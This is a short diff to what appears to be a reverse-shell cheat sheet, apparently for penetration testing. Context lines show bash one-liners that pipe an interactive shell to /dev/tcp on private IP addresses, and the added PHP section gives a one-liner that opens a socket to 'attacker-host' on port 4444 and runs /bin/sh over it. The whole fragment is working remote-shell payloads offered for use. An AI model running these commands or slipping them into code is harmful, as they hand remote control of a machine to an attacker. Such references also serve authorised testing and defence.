@@ -12,6 +12,12 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 /bin/bash -l > /dev/tcp/192.168.45.161/1443 0<&1 2>&1
 ```
 
+##### PHP
+
+```
+php -r '\$sock=fsockopen(\"attacker-host\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'
+```
+
 ### Windows
 #####  CMD
 ```
